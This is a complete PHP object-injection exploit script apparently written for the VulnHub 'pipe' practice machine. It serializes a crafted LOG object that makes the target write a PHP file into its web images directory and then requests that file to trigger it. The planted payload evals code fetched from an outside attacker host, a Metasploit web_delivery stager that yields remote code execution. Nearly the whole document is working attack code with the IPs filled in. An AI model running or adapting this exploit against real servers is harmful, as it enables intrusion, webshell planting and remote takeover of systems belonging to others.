<?php

/*

Exploit Title       : PHP Object Injection Exploit
Author              : wetw0rk
Vulnerable Software : https://download.vulnhub.com/devrandom/pipe.ova

Usage : PHP object injection exploit leveraging the deserialization
        of an object called by a class.

Current Payload (Using Metasploit):
  web_delivery [PHP Target]

*/

include "custom_class.php";

function exploit($rhost, $payload, $payload_name)
{
  $vuln_obj = new LOG();
  $vuln_obj->filename = "/var/www/html/images/".$payload_name;
  $vuln_obj->data     = $payload;

  $target = sprintf("http://%s/index.php", $rhost);
  $data = array("param" => serialize($vuln_obj));

  echo sprintf("[*] Payload: %s\n", serialize($vuln_obj));
  
  $options = array(
    'http' => array(
      'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
      'method'  => "POST",
      'content' => http_build_query($data)
    )
  );
  $context = stream_context_create($options);
  $result  = file_get_contents($target, false, $context);

  if ($result == FALSE)
    echo "something went wrong\n\n";
  echo "[*] Exploit sent to ".$rhost."\n";
  echo "[+] Triggering payload\n";

  file_get_contents("http://".$rhost."/images/".$payload_name);
}

exploit(
  "192.168.0.31",
  "<?php eval(file_get_contents('http://192.168.0.25:111/lhom3UF2iO')); ?>",
  "ploit.php"
);

?>
